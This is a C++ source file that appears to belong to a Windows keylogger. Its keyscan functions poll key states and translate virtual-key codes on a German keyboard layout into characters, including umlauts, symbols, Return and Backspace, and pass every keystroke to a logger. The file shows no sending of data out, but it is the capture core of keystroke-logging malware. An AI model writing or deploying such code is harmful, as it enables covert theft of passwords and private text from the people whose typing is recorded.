#include "pch.h"
#include "keyscan.h"

bool keyscan::scan_char(const int& keycode) {
	bool qeAlt = false;
	//Special treatment for q and e on german keyboard
	if (keycode == 69 || keycode == 81) {
		if (GetAsyncKeyState(VK_MENU)) {
			switch (keycode) {
			case 69:
				m_logger->log('€');
				return true;
			case 81:
				std::cout << '@';
				m_logger->log('@');
				return true;
			}
		}
	}
	if (GetKeyState(VK_CAPITAL) | GetAsyncKeyState(VK_SHIFT)) {
		m_logger->log(char(keycode));
	}
	else {
		m_logger->log(char(keycode + 32));
	}
	return true;
}

bool keyscan::scan_num(const int& keycode) {
	if (keycode > 47 && keycode < 58) {
		m_logger->log(char(keycode));
		return true;
	}
	return false;
}

bool keyscan::scan_specialNum(const int& keycode) {
	if (GetKeyState(VK_CAPITAL) | GetAsyncKeyState(VK_SHIFT)) {
		switch (keycode) {
		case 48:
			m_logger->log('=');
			return true;
		case 49:
			m_logger->log('!');
			return true;
		case 50:
			m_logger->log('\'');
			return true;
		case 51:
			m_logger->log('§');
			return true;
		case 52:
			m_logger->log('$');
			return true;
		case 53:
			m_logger->log('%');
			return true;
		case 54:
			m_logger->log('&');
			return true;
		case 55:
			m_logger->log('/');
			return true;
		case 56:
			m_logger->log('(');
			return true;
		case 57:
			m_logger->log(')');
		default: return true;
		}
	}
	return false;
}

bool keyscan::scan_specialChar(const int& keycode) {
	if (GetAsyncKeyState(VK_MENU)) {
		switch (keycode) {
		case VK_OEM_4:
			m_logger->log('\\');
			return true;
		case VK_OEM_PLUS:
			m_logger->log('~');
			return true;
		case VK_OEM_102:
			m_logger->log('|');
			return true;
		default:
			return false;
		}
	}
	else if (GetKeyState(VK_CAPITAL) | GetAsyncKeyState(VK_SHIFT)) {
		switch (keycode) {
		case VK_OEM_1:
			m_logger->log('Ü');
			return true;
		case VK_OEM_2:
			m_logger->log('\'');
			return true;
		case VK_OEM_3:
			m_logger->log('Ö');
			return true;
		case VK_OEM_4:
			m_logger->log('?');
			return true;
		case VK_OEM_5:
			m_logger->log('°');
			return true;
		case VK_OEM_6:
			m_logger->log('`');
			return true;
		case VK_OEM_7:
			m_logger->log('Ä');
			return true;
		case VK_OEM_PERIOD:
			m_logger->log(':');
			return true;
		case VK_OEM_MINUS:
			m_logger->log('_');
			return true;
		case VK_OEM_COMMA:
			m_logger->log(';');
			return true;
		case VK_OEM_PLUS:
			m_logger->log('*');
			return true;
		case VK_OEM_102:
			m_logger->log('>');
			return true;
		default:
			return false;
		}
	}
	else {
		switch (keycode) {
		case VK_SPACE:
			m_logger->log(' ');
			return true;
		case VK_SHIFT:
			return true;
		case 10:
			return true;
		case VK_RETURN:
			m_logger->log("[return/enter]");
			return true;
		case VK_BACK:
			m_logger->log("[backspace]");
			return true;
		case VK_OEM_1:
			m_logger->log('ü');
			return true;
		case VK_OEM_2:
			m_logger->log('#');
			return true;
		case VK_OEM_3:
			m_logger->log('ö');
			return true;
		case VK_OEM_4:
			m_logger->log('ß');
			return true;
		case VK_OEM_5:
			m_logger->log('^');
			return true;
		case VK_OEM_6:
			m_logger->log('´');
			return true;
		case VK_OEM_7:
			m_logger->log('ä');
			return true;
		case VK_OEM_PERIOD:
			m_logger->log('.');
			return true;
		case VK_OEM_MINUS:
			m_logger->log('-');
			return true;
		case VK_OEM_COMMA:
			m_logger->log(',');
			return true;
		case VK_OEM_PLUS:
			m_logger->log('+');
			return true;
		case VK_OEM_102:
			m_logger->log('<');
			return true;
		default:
			return false;
		}
	}
	return false;
}